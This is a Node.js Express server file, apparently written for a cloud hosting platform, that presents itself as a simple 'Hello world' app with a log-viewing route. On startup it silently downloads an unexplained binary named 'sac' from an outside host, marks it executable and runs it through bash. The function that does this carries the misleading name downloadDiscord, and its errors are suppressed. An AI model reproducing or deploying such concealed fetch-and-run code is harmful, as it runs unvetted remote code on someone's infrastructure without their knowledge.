const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const FILE_PATH = './.npm'; // 目标目录

// =================================================================
// 🌟 步骤 1: 确保目标目录存在 (解决目录不存在的 ENOENT)
// =================================================================

try {
    // 检查目录是否存在，如果不存在则创建它
    if (!fs.existsSync(FILE_PATH)) {
        // recursive: true 允许创建嵌套目录
        fs.mkdirSync(FILE_PATH, { recursive: true });
        console.log(`Successfully created directory: ${FILE_PATH}`);
    }
} catch (err) {
    // 如果创建失败，记录错误（极少发生）
    console.error(`Error attempting to create directory ${FILE_PATH}:`, err);
}

// =================================================================

app.get("/", function(req, res) {
  res.send("Hello world!");
});

// =================================================================
// 🌟 步骤 2: 健壮的 /log 路由 (解决文件不存在的 ENOENT)
// =================================================================

app.get("/log", (req, res) => {
  const logPath = path.join(FILE_PATH, 'log.txt');
  
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      // 检查错误代码。如果错误是 'ENOENT' (文件不存在)
      if (err.code === 'ENOENT') {
        // 返回 200 OK 状态码，并附带一条提示信息，而不是 500 错误
        console.warn('log.txt file not found. Returning status message.', err.message);
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.status(200).send("Log file is not available yet (it may be created by the running process) or was cleared during container restart. Check Scalingo Log Stream for live output.");
        return;
      }
      
      // 如果是其他类型的错误（例如权限错误），则返回 500 错误
      console.error('Unexpected error reading log.txt:', err);
      res.status(500).send("Error reading log.txt");
    } else {
      // 成功读取文件，返回文件内容
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

// =================================================================
// 保持不变的代码
// =================================================================

const downloadDiscord = async () => {
  try {
    // console.log('Start downloading sac...');
    const response = await axios({
      method: 'get',
      url: 'https://amd64.2go.us.kg/sac',
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('sac');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('Download completed');
        exec('chmod +x sac', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const Execute = async () => {
  try {
    await downloadDiscord();
    const command = './sac';
    exec(command, { 
      shell: '/bin/bash'
    });
  } catch (err) {}
};

Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
